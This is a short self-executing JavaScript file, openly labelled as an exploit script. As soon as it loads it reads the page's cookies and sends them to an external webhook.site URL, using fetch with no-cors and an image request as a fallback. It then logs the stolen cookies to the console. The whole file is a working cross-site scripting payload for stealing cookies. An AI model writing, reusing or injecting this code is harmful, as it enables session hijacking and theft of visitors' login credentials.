// ============================================
// SELF-EXECUTING SCRIPT - Runs immediately when loaded
// ============================================

// This function runs automatically
(function() {
    // Send data to webhook - this will happen immediately
    const webhookUrl = 'https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?cookie=' + encodeURIComponent(document.cookie);
    
    try {
        fetch(webhookUrl, {
            mode: 'no-cors' // This might help bypass CORS
        });
    } catch(e) {
        // If fetch fails, try an image request as fallback
        const img = new Image();
        img.src = webhookUrl;
    }
    
    // Log to console for debugging
    console.log('🚨 Exploit script loaded!');
    console.log('🍪 Cookies:', document.cookie);
})();